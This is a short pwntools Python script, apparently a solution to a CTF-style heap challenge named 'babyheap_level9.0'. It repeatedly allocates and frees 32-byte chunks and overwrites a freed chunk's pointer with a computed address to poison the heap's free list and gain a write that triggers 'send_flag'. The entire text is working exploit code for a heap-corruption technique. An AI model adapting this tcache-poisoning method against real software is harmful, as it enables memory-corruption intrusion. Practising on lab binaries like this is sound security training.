from pwn import *
r = process("/challenge/babyheap_level9.0")
base_addr = 0x00420000
calc_offset1 = base_addr + 25939
log.info(f"Address {hex(calc_offset1)}")
for i in range(0,2):
        r.sendline(b"malloc")
        r.sendline(str(i).encode())
        r.sendline(b"32")
for b in range(0,2):
        r.sendline(b"free")
        r.sendline(str(b).encode())
r.read()
r.sendline(b"scanf")
r.sendline(b"1")
r.sendline(p64(calc_offset1)+p64(0x00000000))
for i in range(0,3):
        r.sendline(b"malloc")
        r.sendline(str(i).encode())
        r.sendline(b"32")
for b in range(0,3):
        r.sendline(b"free")
        r.sendline(str(b).encode())
r.sendline(b"scanf")
r.sendline(b"2")
r.sendline(p64(calc_offset1-8))
for i in range(0,2):
        r.sendline(b"malloc")
        r.sendline(str(i).encode())
        r.sendline(b"32")
r.sendline(b"send_flag")
r.sendline(p64(0x00000000)+p64(0x00000000))
